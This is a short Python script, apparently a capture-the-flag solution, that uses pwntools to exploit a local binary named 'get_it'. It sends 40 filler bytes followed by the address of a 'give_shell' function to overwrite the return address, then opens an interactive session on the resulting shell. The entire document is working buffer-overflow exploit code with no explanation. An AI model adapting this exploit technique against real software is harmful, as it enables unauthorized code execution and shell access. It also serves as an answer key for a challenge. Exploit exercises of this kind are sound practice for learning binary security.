from pwn import *

pipe = process("./get_it")

give_shell = 0x4005B6
payload = "A" * 40
payload += p64(give_shell)

print(pipe.recvline())
pipe.sendline(payload)
pipe.interactive()
